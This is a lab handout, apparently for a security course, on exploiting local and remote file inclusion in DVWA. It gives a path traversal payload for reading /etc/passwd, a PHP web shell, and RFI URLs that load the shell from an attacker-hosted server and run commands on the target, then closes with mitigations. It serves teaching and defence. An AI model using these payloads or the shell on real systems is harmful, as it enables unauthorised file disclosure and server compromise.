# Experiment 9: Demonstrating File Inclusion Vulnerabilities (LFI/RFI)

**Aim:** To understand and demonstrate how File Inclusion vulnerabilities can be exploited to read sensitive files from a web server and, in some cases, achieve Remote Code Execution.

---

### 1. Theory

**File Inclusion** vulnerabilities are a type of web application flaw that allows an attacker to control which files are loaded or executed by the server. These vulnerabilities are particularly common in PHP-based applications that use user-supplied input (like URL parameters) to construct file paths for `include()` or `require()` statements without proper sanitization.

There are two primary types of File Inclusion attacks:

- **Local File Inclusion (LFI):** This attack allows an unauthorized user to include files that are already present on the server. By manipulating the input parameter, often using **Path Traversal** sequences (`../`), an attacker can navigate the server's file system and access files outside of the web root directory. This can lead to the disclosure of sensitive information, such as configuration files, source code, or system user lists (`/etc/passwd`).

- **Remote File Inclusion (RFI):** This is a more severe vulnerability that allows an attacker to include and execute files from a remote, attacker-controlled server. If an application is vulnerable to RFI, an attacker can host a malicious script (e.g., a web shell) on their own server and force the target application to fetch and execute it. A successful RFI attack almost always leads to full Remote Code Execution (RCE) on the server, giving the attacker complete control. This vulnerability typically requires insecure server configurations (e.g., `allow_url_include` enabled in PHP).

---

### 2. Requirements

- **Vulnerable Application:** Damn Vulnerable Web Application (DVWA).
- **Web Browser:** A modern browser with developer tools.
- **Local Server Environment:** A local server stack (like XAMPP or Docker) to host DVWA.
- **(For RFI):** A simple local web server (e.g., Python's `http.server`) and a basic PHP web shell script.

---

### 3. Disclaimer

> **⚠️ Educational Use Only:** File inclusion attacks can cause significant damage to a web server. This experiment must only be performed in a controlled, isolated lab environment on applications you own or have explicit permission to test. Unauthorized attacks are illegal and unethical.

---

### 4. Procedure

This procedure uses **Damn Vulnerable Web Application (DVWA)** with the security level set to **Low**.

#### Part A: Local File Inclusion (LFI)

1.  **Setup and Navigate:**

    - Log in to your local DVWA instance.
    - Navigate to the **File Inclusion** page.

2.  **Identify the Vulnerable Parameter:**

    - Observe the URL. It will look something like `.../vulnerabilities/fi/?page=include.php`. The `page` parameter is being used to include different files. Clicking the other file links (`file1.php`, `file2.php`) confirms this. This parameter is our injection point.

3.  **Exploit LFI with Path Traversal:**
    - The goal is to read the `/etc/passwd` file, which contains a list of users on the Linux server.
    - To do this, we need to traverse out of the current web directory (`/var/www/html/vulnerabilities/fi/`) to the root directory and then navigate to `/etc/passwd`.
    - Modify the URL in your browser's address bar to the following payload:
      ```
      http://<YOUR-DVWA-IP>/vulnerabilities/fi/?page=../../../../etc/passwd
      ```
    - Press Enter. The contents of the server's `/etc/passwd` file will be displayed on the web page, confirming the LFI vulnerability.

#### Part B: Remote File Inclusion (RFI)

**Note:** This part requires an insecure server configuration. For educational purposes, you may need to edit your server's `php.ini` file to set `allow_url_include = On` and then restart the web server. This is **not** recommended for production environments.

1.  **Create a Malicious File (Web Shell):**

    - On your attacker machine (this can be your host machine), create a file named `shell.php`.
    - Add the following simple PHP code to it. This script will execute any command passed to it via the `cmd` URL parameter.
      ```php
      <?php
        if (isset($_REQUEST['cmd'])) {
          echo "<pre>";
          system($_REQUEST['cmd']);
          echo "</pre>";
        }
      ?>
      ```

2.  **Host the Malicious File:**

    - Open a terminal in the same directory where you saved `shell.php`.
    - Start a simple Python web server to host the file on your local network:
      ```bash
      python3 -m http.server 8000
      ```
    - Note your attacker machine's IP address (e.g., using `ifconfig` or `ip a`).

3.  **Exploit RFI:**

    - Go back to the DVWA File Inclusion page in your browser.
    - Modify the URL to make the DVWA server include and execute your remote `shell.php` file. Replace `<ATTACKER-IP>` with your machine's IP address.
      ```
      http://<YOUR-DVWA-IP>/vulnerabilities/fi/?page=http://<ATTACKER-IP>:8000/shell.php
      ```
    - Press Enter. The page may appear blank, but your shell has been loaded and executed by the server.

4.  **Execute Commands on the Server:**
    - Now, use the loaded shell to run commands on the DVWA server by adding the `&cmd=` parameter to the URL.
    - To find out which user the web server is running as:
      ```
      http://<YOUR-DVWA-IP>/vulnerabilities/fi/?page=http://<ATTACKER-IP>:8000/shell.php&cmd=whoami
      ```
    - To get a directory listing:
      ```
      http://<YOUR-DVWA-IP>/vulnerabilities/fi/?page=http://<ATTACKER-IP>:8000/shell.php&cmd=ls -la
      ```
    - The command output will be displayed directly on the page, confirming you have achieved Remote Code Execution.

---

### 5. Conclusion

This experiment successfully demonstrated how file inclusion vulnerabilities can be exploited to achieve both sensitive information disclosure (via LFI) and complete server compromise (via RFI). The root cause is trusting user-supplied input in file operations. The key mitigation strategies are to **never use user input directly in file paths** and to implement a strict **allow-list** of files that are permitted to be included. Furthermore, maintaining a hardened server configuration, such as disabling `allow_url_include`, is crucial for preventing RFI.
